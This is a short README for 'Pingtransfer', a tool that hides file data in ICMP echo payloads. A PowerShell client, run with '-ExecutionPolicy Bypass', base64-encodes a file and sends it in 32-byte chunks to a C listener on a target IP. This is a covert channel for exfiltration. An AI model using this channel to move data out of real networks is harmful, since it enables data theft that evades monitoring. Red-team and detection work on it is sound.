# Pingtransfer

This is a simple tool to transfer data through a ping covert channel.

Data is injected in the payload part of the ICMP echo packet (see the [Ping RFC Document] for more details):

[![N|Solid](https://networkdirection.net/dl49?display)](https://nodesource.com/products/nsolid)

[Ping RFC document]: <https://tools.ietf.org/html/rfc792>

#### PowerShell client:
- Encodes the data in base64
- Create chunks of the size of the default MS Windows ICMP payload (32 Bytes)
- Send each chunk to the server

Usage:
```
powershell.exe -ExecutionPolicy Bypass -File ping-client.ps1 yourtargetip /path/to/your/file
```

#### C Posix server:
- Need a C compiler

Usage:
```
gcc pingserver.c -o pingserver
./pingserver
```


Special thanks to Pedro Laguna for the idea and the follow up !
Thanks to my team too for their great feedback !

